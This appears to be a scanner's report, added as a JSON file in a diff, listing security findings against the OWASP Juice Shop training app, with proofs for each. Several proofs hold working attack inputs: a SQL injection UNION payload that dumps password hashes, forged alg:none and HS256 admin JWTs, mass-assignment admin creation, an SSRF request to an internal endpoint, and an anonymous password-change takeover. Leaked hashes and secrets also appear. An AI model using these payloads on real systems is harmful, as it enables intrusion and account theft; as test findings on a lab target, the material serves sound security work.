@@ -1,0 +1,152 @@
+[
+  {
+    "title": "Mass Assignment Privilege Escalation via POST /api/Users",
+    "location": "/api/users",
+    "severity": "critical",
+    "proof": "POST /api/Users with body {\"email\":\"test_mass_assign@test.com\",\"password\":\"test123\",\"isAdmin\":true,\"role\":\"admin\"} returned HTTP 201 with {\"data\":{\"email\":\"test_mass_assign@test.com\",\"role\":\"admin\",\"isActive\":true}}. The user was created with role=admin, granting full administrative privileges.",
+    "stage": "class_probe",
+    "precondition": "Authenticated session (any role)",
+    "affected_actor": "actor_a",
+    "affected_resource": "user"
+  },
+  {
+    "title": "SQL Injection in /rest/products/search — Full Database Extraction",
+    "location": "/rest/products/search",
+    "severity": "critical",
+    "proof": "Payload: apple')) UNION SELECT 1,group_concat(email||':'||password),3,4,5,6,7,8,9 FROM Users-- returned all 28 user rows with email:password_hash including admin@juice-sh.op:0192023a7bbd73250516f069df18b500, role enumeration via UNION SELECT 1,group_concat(id||':'||email||':'||password||':'||role),3,4,5,6,7,8,9 FROM Users-- showed roles (admin, customer, deluxe, accounting). SQLite version 3.44.2 confirmed via sqlite_version(). Table listing: Users, Products, Challenges, etc.",
+    "stage": "class_probe",
+    "precondition": "None",
+    "affected_actor": "anon",
+    "affected_resource": "product"
+  },
+  {
+    "title": "Missing Authentication on Product API (BFLA)",
+    "location": "/api/products/{id}",
+    "severity": "high",
+    "proof": "PUT /api/products/1 with body {\"name\":\"hacked\",\"price\":0.01} returned HTTP 200 with name changed to 'hacked' and price changed to 0.01. No authentication token was required. POST /api/products also allowed creating products (HTTP 201) without auth. Only DELETE required auth (401).",
+    "stage": "class_probe",
+    "precondition": "",
+    "affected_actor": "",
+    "affected_resource": ""
+  },
+  {
+    "title": "JWT Algorithm Confusion Attack - Forged Admin Token via alg:none and HS256 with RSA Public Key",
+    "location": "/rest/user/whoami",
+    "severity": "critical",
+    "proof": "Two forged JWTs accepted by server returning admin identity ({\"user\":{\"id\":1,\"email\":\"admin@juice-sh.op\"}}): 1) alg:none token: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiaXNBY3RpdmUiOnRydWV9LCJiaWQiOjEsImlhdCI6MTc4NDg1ODAzM30. 2) HS256 with RSA public key as HMAC secret: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.[payload].GYtP9oBPm8UcoloXUt8MYuFmGGNCZ8sTRS0g4hmpqLs. Public key obtained from /encryptionkeys/jwt.pub.",
+    "stage": "component",
+    "precondition": "Access to /encryptionkeys/jwt.pub (publicly accessible)",
+    "affected_actor": "anon",
+    "affected_resource": "user"
+  },
+  {
+    "title": "Security Question Enumeration via /rest/user/security-question",
+    "location": "/rest/user/security-question",
+    "severity": "medium",
+    "proof": "GET /rest/user/security-question?email=admin@juice-sh.op returns {\"question\":{\"id\":2,\"question\":\"Mother's maiden name?\"}}. No authentication required. Any email address can be queried to reveal the associated security question, enabling targeted social engineering or brute-force answers.",
+    "stage": "class_probe",
+    "precondition": "",
+    "affected_actor": "",
+    "affected_resource": ""
+  },
+  {
+    "title": "Unauthenticated Mass User Data Disclosure via /api/Users",
+    "location": "/api/users",
+    "severity": "critical",
+    "proof": "GET /api/Users without any auth returns all 30+ users with emails, roles, deluxeTokens, lastLoginIp. Response: {\"status\":\"success\",\"data\":[{\"id\":1,\"email\":\"admin@juice-sh.op\",\"role\":\"admin\"},{\"id\":2,\"email\":\"jim@juice-sh.op\",\"role\":\"customer\"},...]}",
+    "stage": "component",
+    "precondition": "",
+    "affected_actor": "",
+    "affected_resource": ""
+  },
+  {
+    "title": "Unauthenticated basket access and order placement (IDOR + authz bypass)",
+    "location": "/rest/basket/{id}",
+    "severity": "critical",
+    "proof": "GET /rest/basket/1 without auth returns admin basket with products. POST /rest/basket/1/checkout without auth places order: {\"orderConfirmation\":\"b642-a1ad8ed4f3015990\"}. Order appears in /rest/order-history with masked email, totalPrice, products.",
+    "stage": "class_probe",
+    "precondition": "",
+    "affected_actor": "",
+    "affected_resource": ""
+  },
+  {
+    "title": "Unauthenticated order history disclosure via /rest/order-history",
+    "location": "/rest/order-history",
+    "severity": "medium",
+    "proof": "GET /rest/order-history without auth returns all orders: {\"status\":\"success\",\"data\":[{\"orderId\":\"b642-a1ad8ed4f3015990\",\"email\":\"t*st@t*st.c*m\",\"totalPrice\":17.98,\"products\":[...]},...]}",
+    "stage": "class_probe",
+    "precondition": "",
+    "affected_actor": "",
+    "affected_resource": ""
+  },
+  {
+    "title": "Unauthenticated admin account takeover via empty-current-password in /rest/user/change-password",
+    "location": "/rest/user/change-password",
+    "severity": "critical",
+    "proof": "GET /rest/user/change-password?current=&new=admin123&repeat=admin123 (anon, no session) returns: {\"user\":{\"id\":1,\"email\":\"admin@juice-sh.op\",\"password\":\"0192023a7bbd73250516f069df18b500\",\"role\":\"admin\",...}} and changes admin password. Login then succeeds with the new password, returning admin JWT token.",
+    "stage": "class_probe",
+    "precondition": "",
+    "affected_actor": "",
+    "affected_resource": ""
+  },
+  {
+    "title": "Directory Listing - Sensitive Key Disclosure",
+    "location": "/encryptionkeys",
+    "severity": "high",
+    "proof": "Directory listing at /encryptionkeys exposes jwt.pub (RSA public key, 248 bytes) and premium.key (50 bytes, contains deluxe token: 1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42)",
+    "stage": "class_probe",
+    "precondition": "",
+    "affected_actor": "",
+    "affected_resource": ""
+  },
+  {
+    "title": "SSRF via Profile Image URL (Server-Side Request Forgery)",
+    "location": "/profile/image/url",
+    "severity": "high",
+    "proof": "POST /profile/image/url with imageUrl=http://127.0.0.1:3011/rest/admin/application-configuration → server stored URL + dynamically updated CSP img-src + profileImage changed from URL to local file assets/public/images/uploads/24.jpg, proving server-side fetch. The internal /rest/admin/application-configuration endpoint returns full app config including OAuth clientId, authorized redirect URIs, challenge config, and product data.",
+    "stage": "class_probe",
+    "precondition": "Valid JWT token",
+    "affected_actor": "actor_b",
+    "affected_resource": "profile"
+  },
+  {
+    "title": "2FA Bypass via Self-Service TOTP Secret Exposure",
+    "location": "/rest/2fa/setup",
+    "severity": "high",
+    "proof": "1) Registered user worker_user_1744857566@test.com (POST /api/Users). 2) Logged in, got JWT. 3) GET /rest/2fa/status returned secret=24OLLTAN5W5BECFM3I2QZFJUJ7IDCDJ4 and setupToken (even though setup=false). 4) Generated TOTP 388777 via Python TOTP implementation. 5) POST /rest/2fa/setup with {password, initialToken:388777, setupToken} returned 200 (2FA enabled). 6) POST /rest/user/login returned totp_token_required with tmpToken. 7) POST /rest/2fa/verify with {tmpToken, totpToken:854142} returned new JWT. 8) GET /rest/user/whoami with new token returned user identity (id:40, email:worker_user_1744857566@test.com) proving authenticated session.",
+    "stage": "class_probe",
+    "precondition": "",
+    "affected_actor": "",
+    "affected_resource": ""
+  },
+  {
+    "title": "TOTP Secret Disclosure via Unauthenticated /rest/2fa/status",
+    "location": "/rest/2fa/status",
+    "severity": "medium",
+    "proof": "GET /rest/2fa/status without any auth token returned {\"setup\":false,\"secret\":\"JKWFAXQ5KVT3RLSHIWPRCEE6IC2LWOTY\",\"email\":\"test@test.com\",\"setupToken\":\"eyJ0eXAi...(RS256 JWT)\"}. The TOTP secret and setupToken are exposed without authentication.",
+    "stage": "class_probe",
+    "precondition": "Valid JWT token",
+    "affected_actor": "actor_a",
+    "affected_resource": "2fa"
+  },
+  {
+    "title": "Password Hash Leakage via /rest/memories",
+    "location": "/rest/memories",
+    "severity": "medium",
+    "proof": "GET /rest/memories (authenticated) returned user data including MD5 password hashes for all users: bjoern@owasp.org:9283f1b2e9669749081963be0462e466, bjoern.kimminich@gmail.com (admin):6edd9d726cbdc873c539e41ae8757b8c, emma@juice-sh.op:402f1c4a75e316afec5a6ea63147f739, john@juice-sh.op:00479e957b6b42c459ee5746478e4d45, ethereum@juice-sh.op:2c17c6393771ee3048ae34d6b380c5ec",
+    "stage": "class_probe",
+    "precondition": "",
+    "affected_actor": "",
+    "affected_resource": ""
+  },
+  {
+    "title": "Broken access control — cross-actor or unauthenticated object access",
+    "location": "/api/users",
+    "severity": "high",
+    "proof": "Authz matrix HTTP proof: anon GET /api/Users → 200 (sensitive collection); cross-actor GET both 200 on id=1 path=/api/Users; anon DELETE /api/Feedbacks/1 id=1 → 200; cross-actor GET both 200 on id=1 path=/api/Feedbacks; write_tried=True; cells_sample=[{\"resource\": \"/api/Users\", \"actor\": \"anon\", \"method\": \"GET\", \"status\": 200, \"id\": null}, {\"resource\": \"/api/Users\", \"actor\": \"actor_a\", \"method\": \"GET\", \"status\": 200, \"id\": null}, {\"resource\": \"/api/Users\", \"actor\": \"actor_b\", \"method\": \"GET\", \"status\": 200, \"id\": null}, {\"resource\": \"/api/Users/1\", \"actor\": \"anon\", \"method\": \"GET\", \"status\": 200, \"id\": \"1\"}, {\"resource\": \"/api/Users/1\", \"actor\": \"actor_a\", \"method\": \"GET\", \"status\": 200, \"id\": \"1\"}, {\"resource\": \"/api/Users/1\", \"actor\": \"actor_b\", \"method\": \"GET\", \"status\": 200, \"id\": \"1\"}, {\"resource\": \"/api/Users/1\", \"actor\": \"anon\", \"method\": \"PUT\", \"status\": 401, \"id\": \"1\"}, {\"resource\": \"/api/Users/1\", \"actor\": \"anon\", \"method\": \"DELETE\", \"status\": 401, \"id\": \"1\"}]",
+    "stage": "authz_logic",
+    "precondition": "dual-actor sessions actor_a/actor_b and/or unauthenticated",
+    "affected_actor": "actor_b",
+    "affected_resource": "/api/Users"
+  }
+]
